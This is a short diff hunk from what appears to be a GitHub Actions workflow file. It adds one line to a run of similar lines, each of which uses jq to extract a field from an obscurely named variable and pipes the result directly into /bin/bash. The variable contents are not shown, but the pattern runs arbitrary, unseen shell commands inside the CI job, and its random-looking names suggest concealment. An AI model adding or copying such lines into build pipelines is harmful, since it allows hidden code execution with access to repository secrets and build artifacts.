@@ -35,6 +35,7 @@ jobs:
           printf '%s' "$jf0" | jq -r .lsg480 | /bin/bash
           echo $zopt97948 | jq -r .mtk312 | /bin/bash
           printf '%s' "$khnap0616" | jq -r .o2348 | /bin/bash
+          echo $vg705 | jq -r .wbs17 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
